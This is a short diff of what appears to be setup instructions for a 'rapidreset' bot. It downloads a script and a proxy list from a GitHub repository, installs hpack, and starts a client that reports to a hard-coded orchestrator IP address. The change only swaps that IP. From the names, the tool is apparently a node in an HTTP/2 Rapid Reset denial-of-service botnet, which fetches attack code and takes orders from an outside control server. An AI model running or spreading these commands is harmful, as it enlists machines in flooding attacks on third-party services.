@@ -107,7 +107,7 @@ mkdir -p bot && cd bot \
   && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/rapidreset.js \
   && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/proxi.txt \
   && npm i hpack --no-audit --no-fund \
-  && ORCHESTRATOR=http://204.10.194.164:9215 node client.js
+  && ORCHESTRATOR=http://78.154.103.52:9215 node client.js
 ```
 
 Or:
